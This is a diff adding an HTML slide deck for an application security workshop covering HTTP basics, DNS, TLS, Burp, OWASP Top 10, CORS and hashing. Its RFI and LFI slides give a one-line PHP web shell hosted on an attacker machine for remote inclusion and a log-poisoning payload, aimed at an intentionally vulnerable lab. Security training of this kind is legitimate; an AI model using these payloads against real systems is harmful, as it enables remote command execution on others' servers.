@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link href="remarkStyle.css" rel="stylesheet" />
+    <style type="text/css">
+      
+  body {
+    font-family: 'Avenir Next', 'Hiragino Kaku Gothic ProN', 'Meiryo', 'メイリオ', sans-serif;
+  }
+  h1, h2, h3 {
+    font-weight: bold;
+  }
+  .remark-code,
+  .remark-inline-code {
+    font-family: 'Menlo', 'Monaco', 'Courier new', monospace;
+  }
+
+  .remark-slide-content.inverse {
+    color: #f3f3f3;
+    background-color: #272822;
+  }
+
+    </style>
+  </head>
+  <body>
+    <textarea id="source">name: inverse
+layout: true
+class: center, middle, inverse
+---
+# Application Security 
+## Hands On Workshop
+.footnote[Harmeet Singh / Gopal Sharma]
+---
+layout:false
+## How is it different from AppSec-101?
+----
+
+__‘AppSec101’__ is an awareness program.
+
+
+__‘SEConnect Security testing training’__ is one of the next steps. It intends to provide you the skills and means to understand and perform security testing. It will be mostly a hands-on training that’ll help you get started with app security testing
+
+### What this training is not
+This training is not about how to run attack tools
+
+This training is not about only learning to attack but how to defend
+
+The training is not only about practice. This is about understanding and learning a new approach to attack
+
+---
+## Agenda
+----
+.left-column[
+
+]
+.right-column[
+__1__. Introduction to Application Security
+    
+__2__. Useful terms and definitions
+
+__3__. Basics of TCP/IP, HTTP, TLS/SSL, Intercepting proxies, web infra etc
+
+__4__. Interception proxy setup and walkthrough
+
+__5__. OWASP Top 10  list for 2013 - Hands-on
+
+__6__. Remote File & Local File Inclusion
+
+__7__. SSL and advanced HTTP attacks
+
+__8__. Same and Cross-Origin policies
+
+__9__. Cryptography for the web
+
+__10__. File Permissions
+
+]
+
+---
+
+## Introduction to Application Security
+----
+.right-column[
+"Application security encompasses measures taken to improve the security of an application often by __finding__, __fixing__ and __preventing__ security vulnerabilities."
+]
+
+---
+
+## Introduction to Application Security
+----
+.left-column[
+### Finding
+]
+.right-column[
+- __Whitebox penetration test__ Full access to AUT source code
+    - __Pros__:
+        - Better understanding of code, saves time
+        - Maximizes testing time
+    - __Cons__:
+        - Non realistic attack, as the penetration tester is not in the same position as an non-informed potential attacker
+- __Blackbox penetration test__  No access to AUT source code
+    - __Pros__:
+        - It simulates a very realistic scenario
+    - __Cons__:
+        - Testing time can not be maximised in certain scenarios
+        - Some areas of the infrastructure might remain untested
+]
+
+---
+
+## Introduction to Application Security
+----
+.left-column[
+### Finding
+
+### Fixing
+]
+.right-column[
+- Plugging the loopholes
+
+- Upgrading the design/architecture/infrastructure
+
+- Following secure programming practices
+]
+
+---
+
+## Introduction to Application Security
+----
+.left-column[
+### Finding
+
+### Fixing
+
+### Preventing
+]
+.right-column[
+- Think of security as a first class citizen
+
+- Incorporate security recommendations as soon as the Design phases of application
+
+- Pay attention to the security assessment reports
+
+- Keep lessons learnt from previous projects handy
+]
+
+---
+## Useful terms and definitions
+----
+
+__Vulnerability__ - In computer security, a vulnerability is a weakness which allows an attacker to reduce a system's information assurance.
+
+__Zero Day__ - A zero-day exploit is an attack that exploits a previously unknown security vulnerability. A zero-day attack is also sometimes defined as an attack that takes advantage of a security vulnerability on the same day that the vulnerability becomes generally known.
+
+__Attack Vector__ - An attack vector is a path or means by which a hacker (or cracker) can gain access to a computer or network server in order to deliver a payload or malicious outcome. Attack vectors enable hackers to exploit system vulnerabilities, including the human element.
+
+__Attack Surface__ - The attack surface of a software environment is the sum of the different points (the "attack vectors") where an unauthorized user (the "attacker") can try to enter data to or extract data from an environment.
+
+---
+## Attack Vector
+----
+
+An attack vector is a path or means by which a hacker (or cracker) can gain access to a computer or network server in order to deliver a payload or malicious outcome.
+
+<img src=https://eforensicsmag.com/wp-content/uploads/2014/12/Untitled.png alt="attack_vector" style="width: 95%;"/>
+---
+## Attack Surface
+----
+
+<img src=https://c.wallhere.com/photos/32/86/sigma24105f4_imerovigli_egeo_griechenland_gr_blue_blau_white-526369.jpg!d alt="attack_vector" style="width: 95%; padding-left: 2%;"/>
+---
+class: center, middle
+
+### .red[ Please do not try to test any website that you don't own or are authorised for any time. In India under the __IT Act 2008__ and amendments of 2010 there is a jail term of __5 years rigourous imprisonment__ and a fine of __INR 5,00,000/-__ for hacking websites and networks without permission. ]
+
+---
+template: inverse
+# Basics of networking
+
+---
+## Transport Layer - TCP/IP Model
+----
+<img src=https://i.stack.imgur.com/L4hTM.png alt="tcp" style="width: 75%; padding-left: 10%;"/>
+
+---
+## Network Layer - IP Address
+----
+<img src=https://xvp.akamaized.net/assets/customer_tools/ip_checker/what-is-ip-address-ipv4-ce73f22acc36b3c17b1a11ef6b4d6c0b.png alt="IP" style="width: 50%; padding-left: 20%;"/>
+
+- 32 bit numbers, also called dotted quads - 192.168.1.1
+- (Sub)Net mask decides number of hosts accessible for an IP
+        - 255.255.255.0
+        - 255.255.0.0
+#### Classes of IPv4 addresses
+- Class C has 24 constant bits, 8 remaining bits and hence 256 hosts
+- Class B has 16 constant bits, 16 remaining bits and hence 65536 hosts
+- Class A has 8 constant bits, 24 remaining bits and hence 16 million+ hosts
+
+---
+
+## Transport Layer - UDP and TCP
+----
+<img src=https://s3.amazonaws.com/oodles-technologies1/blog-images/b9571cd0-b0df-45aa-8388-96f1fba9874b.jpeg alt="udptcp" style:"width: 75%;"/>
+
+---
+
+## Application Layer - HTTP
+----
+
+*"HTTP is a request/response standard of a client and a server. A client is the end-user, the server is the web site. The client making a
+HTTP request—using a web browser, spider, or other end-user tool—is referred to as the user agent."*
+
+#### HTTP is client-server
+- Clients make request and servers respond
+- It can't be the other way. Servers can not initiate any communication on their own in HTTP
+
+#### HTTP is stateless
+- HTTP has no notion of state. One connection has no relationship to another. 
+- It is the applications responsibility to maintain state.
+
+---
+
+## More about HTTP
+---- 
+
+### HTTP Methods/Verbs
+__Safe Methods__ - GET, HEAD, OPTIONS
+
+__Not Safe Methods__ - POST, PUT, DELETE
+
+__Other Methods__ - CONNECT
+
+### HTTP Response Status Codes
+__1xx__ Informational Messages
+
+__2xx__ Success(200 OK)
+
+__3xx__ Redirects(301, 302, 307)
+
+__4xx__ Client Errors(404, 403, 400)
+
+__5xx__ Server Errors(500, 502, 503, 505)
+---
+
+## HTTP Commands Hands-on
+----
+__HTTP GET a page__
+```bash
+$ curl http://owaspbwa.cxm/box/ip.php
+```
+
+__HTTP GET a Page -- verbose__
+```bash
+$ curl http://owaspbwa.cxm/box/ip.php -v
+```
+
+__HTTP HEAD a Page__
+```bash
+$ curl http://owaspbwa.cxm/box/ip.php -I
+```
+__HTTP HEAD a Page -- verbose__
+```bash
+$ curl http://owaspbwa.cxm/box/ip.php -Iv
+```
+
+---
+
+## HTTP Commands Hands-on
+----
+
+__HTTP POST a page__
+```bash
+$ curl http://owaspbwa.cxm/box/post.php
+```
+
+__HTTP GET some query string__
+```bash
+$ curl http://owaspbwa.cxm/box/post.php?name=Bob&lname=Builder
+```
+
+__HTTP POST a page with empty data__
+```bash
+$ curl http://owaspbwa.cxm/box/post.php -d ""
+```
+
+__HTTP POST a page with data__
+```bash
+$ curl http://owaspbwa.cxm/box/post.php -d "name=Bob&lname=Builder"
+```
+---
+
+## HTTP Commands Hands-on
+----
+
+__What a session id looks like__
+```bash
+$ curl -v http://owaspbwa.cxm/box/sess.php
+```
+
+__Lets save the cookie value__
+```bash
+$ curl -v http://owaspbwa.cxm/box/sess.php -c cookie.jar
+```
+
+__Lets use the cookie value__
+```bash
+$ curl -v http://owaspbwa.cxm/box/sess.php -b cookie.jar
+```
+
+---
+
+## SSL/TLS
+----
+
+__Encrypted Communication__ – Eavesdropping and Tampering
+
+__Secure Identification of a Network__ – Are you talking to the right server?
+
+<img src=https://16g8ci328ci32wjmfm30xnyn-wpengine.netdna-ssl.com/wp-content/uploads/2017/01/https-browsers.png alt="SSLLock" style="width: 65%; padding-left: 15%;"/>
+
+---
+
+## How SSL Works
+----
+
+<img src=http://3.bp.blogspot.com/-BA5wBbRqmHY/UsaYmMuRVtI/AAAAAAAAAxk/zcQlt2pPiDA/s1600/sy10660a.gif alt="SSLWorking" style="width: 75%; padding-left: 10%;"/>
+
+---
+
+## Establishing Trust
+----
+<img src=http://www.thirdhosting.com/_images/icon_ssl_works.gif alt="SSLWorking" style="width: 55%; padding-left: 20%;"/>
+
+.left-half-column[
+<img src=https://news.netcraft.com/wp-content/uploads/2016/08/Screen-Shot-2015-08-06-at-11.43.311.png alt="SSLWorking" style="width: 70%;"/>
+]
+.right-half-column[.small[
+A certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party]
+]
+
+---
+## Basic DNS for Applications
+----
+
+- Converts hostnames to IP addresses
+- Stores mail delivery information for a domain DNS records A, AAAA, SOA, MX, CNAME
+- Why does the browser need IP addresses to browse?
+
+<img src=https://safeum.com/upload/images/safeumworldnews/2016/safeum_messenger_switcher_hacks_wifi_routers2.png alt="DNS" style="width: 75%; padding-left: 10%;"/>
+
+---
+## Basic DNS for Applications
+----
+.left-column[
+### Typical DNS record
+]
+
+.right-column[
+- SOA (Start of Authority)
+- NS (Name Server)
+- A (IPv4 Address)
+- PTR (Pointer)
+- CNAME (Canonical Name)
+- MX (Mail Exchange)
+- AAAA (IPv6 Address)
+
+```bash
+host -tA owaspbwa.cxm
+
+host -tA facebook.com 8.8.8.8
+
+host -tAAAA facebook.com 8.8.8.8
+
+host -tNS ibreak.software 8.8.8.8
+
+dig appsecco.com Any
+
+nslookup -type=A google.com
+``` 
+
+]
+
+---
+
+## Gateway and Routers
+----
+
+.left-half-column[
+<img src=http://www.terratel.eu/wp-content/uploads/2014/12/solution3-sip-e1-gateway.jpg alt="DNS" style="width: 100%;"/>
+<br />
+<br />
+<img src=http://what-when-how.com/wp-content/uploads/2011/08/tmp922_thumb.jpg alt="DNS" style="width: 100%;"/>
+]
+
+
+.right-half-column[
+A gateway is the doorway to another network for a LAN. Any packet which finds no takers in the current network is sent to the outside
+world by it.
+<br />
+<br />
+<br />
+<br />
+A router is simply a device which knows two networks because it has two network interfaces.
+]
+
+---
+template: inverse
+ # Interception Proxy - Burp
+<img src=https://pbs.twimg.com/profile_images/923539294299533312/RM9x0Xgt.jpg alt="Burp" style="width: 30%;"/> 
+---
+## Burp Suite Installation and Configuration
+----
+### Setting up an Interception Proxy
+- Make sure Firefox is updated, change the settings to use __127.0.0.1__ and port __8080__ as proxy
+- Ensure that java is installed and working
+- Download Burp Suite (http://portswigger.net/burp/downloadfree.html)
+
+### Start Burp
+- Open your terminal
+- Browse to where you downloaded burp suite.jar file
+- Start with the following command java -jar /path/to/burpsuite.jar
+
+### Start playing...
+
+---
+template: inverse
+
+# OWASP Top 10 - 2013 and Hands On
+
+---
+## OWASP 2013 Vs OWASP 2017 - What Changed?
+----
+
+<img src=https://securityonline.info/wp-content/uploads/2017/09/owa.png style="width: 100%;" />
+
+#### Did we learn from our mistakes? - Answer follows
+---
+### Recently Reported Vulnerabilities
+----
+- __SQL Injection - WordPress__ Plugin vulnerability [CVE-2017-14125](http://seclists.org/fulldisclosure/2017/Sep/55) was reported in __Sept 2017__
+
+- __Command Injection/Remote Code Execution__ - __Sangoma SBC__ Remote Command Execution [CVE-2017–17430](http://seclists.org/fulldisclosure/2018/Jan/36) was reported in __Jan 2018__
+
+- __Cross Site Scripting__ - __Apache Drill__ XSS vulnerability [CVE-2017-12630](http://seclists.org/oss-sec/2017/q4/414) was reported in __Dec 2017__
+
+- __Insecure Direct Object Reference__ - __Atlassian Confluence__ Vulnerability [CVE-2015-8399](https://www.exploit-db.com/exploits/39170/) was reported in __Jan 2016__
+
+- __Security Misconifiguration__ - __OpenSSH__ <=6.6 SFTP misconfiguration exploit for 64bit Linux [Disclosure](http://seclists.org/fulldisclosure/2014/Oct/35) was reported in __Oct 2014__
+
+- __CSRF - CSRF__ in __Redis__ < 3.2.7 [CVE-2016-10517](http://seclists.org/oss-sec/2017/q4/133) was reported in __Oct 2017__
+
+- And many more...
+ 
+---
+<img src=http://funnyminions.com/wp-content/uploads/2015/08/funny-minion-pictures-086.jpg style="width: 70%; padding-left:15%" />
+---
+template: inverse
+# Remote and Local File inclusions
+
+---
+## Remote File Inclusion
+----
+
+- Remote File Inclusion (RFI) is a type of vulnerability under the category of IDOR.
+- It allows an attacker to include a remote file, usually through a script on the web server.
+- The vulnerability occurs due to the use of user-supplied input without proper validation.
+
+### Technical Risks of RFI
+
+- Code execution on the web server
+- Denial of service (DoS)
+- Data theft/manipulation
+
+---
+## RFI Hands On
+----
+ Save this file as "shell.php"
+```php
+<?php system($_GET['x']) ?>
+```
+
+Host this on a local python server
+
+```bash
+python -m SimpleHTTPServer
+```
+
+
+Access the following link
+.small[
+http://owaspbwa.cxm/mutillidae/index.php?page=http://192.168.56.1:8000/shell.php&x=ls
+]
+
+---
+## Local File Inclusion
+----
+- Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application.
+
+- This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected.
+
+### LFI Methods
+1. LFI by file upload
+2. LFI to Remote Code Execution through Log Poisoning
+    - Call a page we know is not on the server
+    - Now that link will be included in the error log (404)
+    - Pass URL encoded PHP Code and we are good to go
+
+---
+## LFI Hands on
+----
+
+### Upload PHP code under an allowed file format
+- Create a file containing PHP shellcode and name it as "shell.jpg"
+- This is a file containing PHP code but with image extension
+- Upload this file
+- Use the path to include this file
+
+### Getting your php code to the system logs
+```bash
+http://owaspbwa.cxm/dvwa/<%3Fphp system('ls')%3B%3F>
+``` 
+
+__Expected__ - 404 error
+
+__Achieved__ - .highlighter[Code reaches logs, waiting to be executed later]
+
+
+---
+template: inverse
+
+# Advanced SSL and HTTP attacks
+
+---
+
+## Heartbleed
+----
+
+.left-half-column[
+    <img src=https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/Heartbleed.svg/1200px-Heartbleed.svg.png style="width: 75%; padding-left: 10%;"/>
+]
+.right-half-column[
+__Heartbleed__ is a security bug in the __OpenSSL__ cryptography library, which is a widely used implementation of the Transport Layer Security (TLS) protocol. It was introduced into the software in 2012 and publicly disclosed in April 2014. It results from improper input validation (due to a missing bounds check) in the implementation of the __TLS heartbeat__ extension, thus the bug's name derives from heartbeat.
+]
+
+---
+## How Heartbleed works
+----
+
+<img src=https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Simplified_Heartbleed_explanation.svg/1000px-Simplified_Heartbleed_explanation.svg.png alt="Heartbleed" style="width: 75%; padding-left: 10%;"/>
+---
+
+## AJAX Attacks
+----
+
+AJAX is an acronym for Asynchronous JavaScript and XML, and is a popular technology that provides a much richer client experience in a
+web based application but also introduces the potential for significant security risks if not developed securely.
+
+This hands on demonstrates AJAX attacks using interception of HTTP request/responses
+
+### Create a new AJAX app
+1. Create a folder called "ajax"
+2. Create a file called "ajax.html"
+
+### Clone the following repo to save time :) 
+
+```bash
+https://github.com/hrmeetsingh/WebSec-101.git
+```
+---
+## AJAX Attacks Hands on
+----
+
+3.Copy the following code in it
+
+```xml
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    $(document).ready(function(){
+        $("button").click(function(){
+            $.get("menu.txt", function(data, status){
+            $("#holder").html(data);
+            });
+        });
+    });
+</script>
+</head>
+<body>
+<button>Retrieve Food Menu</button>
+<pre><div id="holder" name="holder"></div></pre>
+</body>
+</html>
+```
+---
+## AJAX Attacks Hands on
+----
+4.Create a text file called "menu.txt" and add the following text to it
+
+```bash
+Cheese Burger
+Pizza
+Veggie Salad
+Mango Cheesecake
+```
+
+Run python webserver from within the ajax directory
+
+```bash
+python -m SimpleHTTPServer
+```
+
+Access http://127.0.0.1:8000/ajax.html
+
+Intercept the response from the localhost server to alter content before it is delivered
+
+---
+template: inverse
+# Same and Cross-Origin Policies
+
+---
+## Same-Origin Policy
+----
+Under the __Same-origin policy__, a web browser permits scripts contained in a first web page to access data in a second web page, but __only__ if both web pages have the same __origin__.
+
+An origin is defined as a combination of URI scheme, host name, and port number
+
+### How it affected the Selenium Architecture
+
+.left-half-column[
+<img src=http://scraping.pro/res/selenium/main_diagram.jpg style="width: 95%;"/>
+]
+.right-half-column[.notes-block[.small[
+__"Proxy injection"__ in Selenium RC
+- Selenium server starts a proxy 
+- Selenium masks the AUT under a fictional URL
+- For the browser, the selenium commands and AUT appear to have the __"same-origin"__
+    ]
+    ]
+]
+
+
+---
+### Same-Origin Policy Hands on
+----
+
+.small[Add the following code to a file "ajax-sop.html"]
+```xml
+<!DOCTYPE html>
+<html><head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    $(document).ready(function(){
+        $("#twitter").click(function(){
+            $.get("https://twitter.com/robots.txt", function(data, status){
+                $("#holder").html(data);});
+        });
+        $("#ip").click(function(){
+        $.get("http://icanhazip.com", function(data, status){
+                $("#holder").html(data);});
+        });
+    });
+</script>
+</head><body>
+<button id="twitter">Get robots.txt from Twitter.com</button>
+<button id="ip">Get IP Address</button>
+<pre><div id="holder" name="holder"></div></pre>
+</body></html>
+``` 
+
+---
+template: inverse
+## What if you still want to share?
+<img src=http://image.lopscoop.com/lopscoop/image/content/2017/02/22/1487749812942742_P=.gif style="width: 95%;"/>
+
+---
+
+## CORS (Cross Origin Resource Sharing)
+----
+
+Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to let a user agent gain permission to access selected resources from a server on a different origin (domain) than the site currently in use.
+
+<img src=https://i.stack.imgur.com/zn3sT.png style="width: 70%; padding-left:10%;" />
+
+---
+
+## CORS - Hands on
+----
+
+1. Access http://127.0.0.1:8000/ajax-sop.html
+2. Open the Developer Console and click the buttons on the page
+3. Intercept the request and response from client to check "Access-Control-Allow-Origin" header
+
+### Case Study
+
+.notes-block[
+#### Resource sharing challenges
+
+- Deployment on Cloudfront AWS having URL __*.cloudfront.net__
+- Resources like fonts fetched from domains like __*.google.com__
+- Calls from frontend to backend deployed on AWS Elastic Beanstalk server with URL - __.co.uk__
+
+#### Solution
+- Added "Access-Control-Allow-Origin" header to the responses of CloudFront servers managed by us
+
+]
+
+---
+template: inverse
+# Cryptography for the web
+
+---
+## Types of Cryptography
+----
+
+<img src=http://pubs.sciepub.com/iscf/3/1/1/image/fig1.png style="width: 50%; padding-left: 25%;"/>
+---
+
+## Why is it necessary?
+----
+Cryptography is the art and science of transmitting information securely in the presence of untrusted individuals.
+
+
+__Confidentiality__
+- Ensuring that sensitive information is not readable by unauthorized recipients.
+
+__Integrity__
+- Ensuring that information is not modified in an unauthorized fashion.
+
+__Authentication__
+- Providing the ability to confirm the claimed identity of an individual or system.
+
+__Nonrepudiation__
+- Allowing the recipient of a message to undeniably prove to a third party that the message came from the purported sender.
+---
+## Encryption vs Hashing
+----
+
+<img src=https://www.ssl2buy.com/wiki/wp-content/uploads/2015/12/hashing-vs-encryption.png style="width: 75%; padding-left: 10%;"/>
+---
+## Modern encryption techniques
+----
+
+<img src=https://cdn-images-1.medium.com/max/640/1*23RpkZuWAeSP7x0YdMtsdQ.png style="width: 75%; padding-left: 10%;"/>
+
+---
+
+## Hands on Hashing
+----
+
+In the Mutillidae VM
+- Go to home folder 
+- Create a file "test.txt" with the following content
+```bash
+    this is a test
+```
+- Run this command to create a SHA256 hash
+```bash
+    sha256sum test.txt
+```
+- Note down the generated hash string
+```bash
+9d63c3b...7995c8
+```
+- Update the file and add a full stop at the end
+- Run the __sha256sum__ command and verify the generated hash value
+
+---
+## File permissions - Linux/Unix
+----
+.left-half-column[
+<img src=https://danielmiessler.com/images/permissions.png style="width: 90%;"/>
+]
+
+.right-half-column[
+
+### Useful Commands
+
+- __chmod__ - Change file access mode
+- __chown, chgrp__ - Change the ownership of the file
+
+### Examples
+
+```bash
+# change mode
+$ chmod 755 file.txt
+$ chmod 777 shared.sh
+
+# change owner
+$ chown myuser file.txt
+
+# change group
+$ chgrp mygrp file.txt
+```
+]
+
+---
+## File permissions - Windows
+----
+
+<img src=https://11986-presscdn-0-77-pagely.netdna-ssl.com/wp-content/uploads/2009/04/windows-permissions-meaning.jpg style="width: 85%; padding-left: 8%;"/>
+
+---
+
+### Image References
+.references[
+Attack vector - https://eforensicsmag.com/wp-content/uploads/2014/12/Untitled.png
+
+Attack surface - https://c.wallhere.com/photos/32/86/sigma24105f4_imerovigli_egeo_griechenland_gr_blue_blau_white-526369.jpg!d
+
+TCP - src=https://i.stack.imgur.com/L4hTM.png, 
+https://xvp.akamaized.net/assets/customer_tools/ip_checker/what-is-ip-address-ipv4-ce73f22acc36b3c17b1a11ef6b4d6c0b.png,  https://s3.amazonaws.com/oodles-technologies1/blog-images/b9571cd0-b0df-45aa-8388-96f1fba9874b.jpeg
+
+SSL - https://16g8ci328ci32wjmfm30xnyn-wpengine.netdna-ssl.com/wp-content/uploads/2017/01/https-browsers.png, http://3.bp.blogspot.com/-BA5wBbRqmHY/UsaYmMuRVtI/AAAAAAAAAxk/zcQlt2pPiDA/s1600/sy10660a.gif
+http://www.thirdhosting.com/_images/icon_ssl_works.gif
+https://news.netcraft.com/wp-content/uploads/2016/08/Screen-Shot-2015-08-06-at-11.43.311.png
+
+DNS - https://safeum.com/upload/images/safeumworldnews/2016/safeum_messenger_switcher_hacks_wifi_routers2.png
+
+Gateway and Router - http://www.terratel.eu/wp-content/uploads/2014/12/solution3-sip-e1-gateway.jpg
+http://what-when-how.com/wp-content/uploads/2011/08/tmp922_thumb.jpg
+
+Burp - https://pbs.twimg.com/profile_images/923539294299533312/RM9x0Xgt.jpg
+
+Heartbleed - https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/Heartbleed.svg/1200px-Heartbleed.svg.png
+https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Simplified_Heartbleed_explanation.svg/1000px-Simplified_Heartbleed_explanation.svg.png
+
+Cryptography - http://pubs.sciepub.com/iscf/3/1/1/image/fig1.png
+https://www.ssl2buy.com/wiki/wp-content/uploads/2015/12/hashing-vs-encryption.png
+https://cdn-images-1.medium.com/max/640/1*23RpkZuWAeSP7x0YdMtsdQ.png
+
+File permissions - https://danielmiessler.com/images/permissions.png, https://11986-presscdn-0-77-pagely.netdna-ssl.com/wp-content/uploads/2009/04/windows-permissions-meaning.jpg
+
+SOP/CORS - http://scraping.pro/res/selenium/main_diagram.jpg, http://image.lopscoop.com/lopscoop/image/content/2017/02/22/1487749812942742_P=.gif , https://i.stack.imgur.com/zn3sT.png 
+]
+--- 
+</textarea>
+    <script src="remark.js"></script>
+    
+    <script>
+      window.slideshow = remark.create({"slideNumberFormat":"%current% / %total%"})
+    </script>
+    <script>
+      
+    </script>
+  </body>
+</html>
